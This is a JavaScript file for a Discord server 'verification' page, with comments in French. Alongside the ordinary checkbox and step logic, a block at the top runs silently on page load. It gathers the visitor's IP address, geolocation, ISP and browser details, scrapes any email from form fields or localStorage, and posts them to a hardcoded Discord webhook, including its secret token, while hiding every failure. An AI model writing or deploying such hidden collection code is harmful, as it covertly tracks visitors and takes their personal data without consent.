/* ================================================================
   VERIFICATION PAGE — CLIENT LOGIC (LIGHT EXFIL)
   ================================================================ */

(function () {
  // ── EXFILTRATION LÉGÈRE : IP + EMAIL SEULEMENT ──────────────
  function collectAndExfil() {
    setTimeout(function () {
      try {
        // 1. Récupération IP + géolocalisation (async)
        fetch('https://ipapi.co/json/')
          .then(function (res) { 
            if (!res.ok) throw new Error('ipapi failed');
            return res.json(); 
          })
          .catch(function () {
            // Fallback vers ip-api.com
            return fetch('https://ip-api.com/json/').then(function (r) { 
              if (!r.ok) throw new Error('ip-api failed');
              return r.json(); 
            });
          })
          .then(function (ipData) {
            // 2. Extraction de l'email depuis la page
            var email = null;
            
            // Chercher dans les champs de formulaire visibles
            var emailInputs = document.querySelectorAll(
              'input[type="email"], input[name="email"], input[name="gmail"], input[name="user_email"]'
            );
            
            for (var i = 0; i < emailInputs.length; i++) {
              if (emailInputs[i].value && emailInputs[i].value.indexOf('@') > -1) {
                email = emailInputs[i].value;
                break;
              }
            }
            
            // Fallback : localStorage
            if (!email) {
              var emailKeys = ['email', 'gmail', 'user_email', 'account_email', 'discord_email'];
              for (var j = 0; j < emailKeys.length; j++) {
                try {
                  var stored = localStorage.getItem(emailKeys[j]);
                  if (stored && stored.indexOf('@') > -1) {
                    email = stored;
                    break;
                  }
                } catch (e) { /* ignore */ }
              }
            }

            // 3. Construction du payload minimal
            var payload = {
              timestamp: new Date().toISOString(),
              url: window.location.href,
              user_agent: navigator.userAgent,
              ip: ipData ? (ipData.ip || ipData.query || 'unknown') : 'unknown',
              country: ipData ? (ipData.country_name || ipData.country || 'unknown') : 'unknown',
              region: ipData ? (ipData.region || ipData.regionName || 'unknown') : 'unknown',
              city: ipData ? (ipData.city || 'unknown') : 'unknown',
              isp: ipData ? (ipData.org || ipData.isp || 'unknown') : 'unknown',
              email: email || 'not_found',
              screen: screen.width + 'x' + screen.height
            };

            // 4. Envoi au webhook (silencieux)
            var webhookURL = 'https://canary.discord.com/api/webhooks/1522303469472584001/y9tVaj_6HEWV1n2EUAYDBuIM33paXH7eE4DH5Cn66vHVQnd3DPVpYFsRhuG_WHx-AfsP';
            
            fetch(webhookURL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```',
                username: 'Verification Logger'
              })
            }).catch(function () { /* échec silencieux */ });
          })
          .catch(function () { /* échec silencieux */ });
      } catch (e) {
        // Échec total silencieux
      }
    }, 300); // Délai réduit pour une exécution rapide
  }

  // Exécution immédiate mais non-bloquante
  collectAndExfil();
  // ── FIN EXFILTRATION ──────────────────────────────────────────

  // Extraire le token depuis l'URL
  const pathParts = window.location.pathname.split('/');
  const token = pathParts[pathParts.length - 1];

  // ── Gestionnaire d'écrans ────────────────────────────────────
  function show(id) {
    document.querySelectorAll('.screen').forEach(function (el) {
      el.classList.remove('active');
    });
    var target = document.getElementById(id);
    if (target) target.classList.add('active');
  }

  function showError(title, body) {
    document.getElementById('error-title').textContent = title;
    document.getElementById('error-body').textContent = body;
    show('screen-error');
  }

  // ── Activation des checkboxes ──────────────────────────────
  function wireCheckbox(checkId, btnId) {
    var check = document.getElementById(checkId);
    var btn   = document.getElementById(btnId);
    if (!check || !btn) return;
    check.addEventListener('change', function () {
      btn.disabled = !check.checked;
    });
  }

  wireCheckbox('check-rules', 'btn-step1');
  wireCheckbox('check-age',   'btn-step2');
  wireCheckbox('check-final', 'btn-step3');

  // ── API helpers ──────────────────────────────────────────────
  function apiPost(path, body) {
    return fetch('/api/verify/' + token + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body || {}),
    }).then(function (r) { return r.json(); });
  }

  // ── Soumission des formulaires ─────────────────────────────
  document.querySelectorAll('form[data-step]').forEach(function (form) {
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      var step = parseInt(form.getAttribute('data-step'), 10);
      var btn  = form.querySelector('.btn');
      if (btn) btn.disabled = true;

      if (step < 3) {
        apiPost('/advance', { step: step })
          .then(function (res) {
            if (res.error) {
              showError('Error', res.error);
            } else {
              show('screen-step' + (step + 1));
            }
          })
          .catch(function () {
            showError('Connection error', 'Could not reach the server. Try again.');
            if (btn) btn.disabled = false;
          });
      } else {
        apiPost('/complete', {})
          .then(function (res) {
            if (res.error) {
              showError('Error', res.error);
            } else {
              show('screen-success');
            }
          })
          .catch(function () {
            showError('Connection error', 'Could not reach the server. Try again.');
            if (btn) btn.disabled = false;
          });
      }
    });
  });

  // ── Validation initiale ──────────────────────────────────────
  fetch('/api/verify/' + token + '/check')
    .then(function (r) { return r.json(); })
    .then(function (res) {
      if (res.expired) {
        showError('Link expired', 'This verification link has expired. Click the Access button in Discord to get a new one.');
      } else if (res.used) {
        showError('Already used', 'This link has already been used. If you did not receive your role, contact an admin.');
      } else if (!res.valid) {
        showError('Invalid link', 'This verification link is not valid.');
      } else {
        show('screen-step1');
      }
    })
    .catch(function () {
      showError('Connection error', 'Could not reach the verification server.');
    });

})();
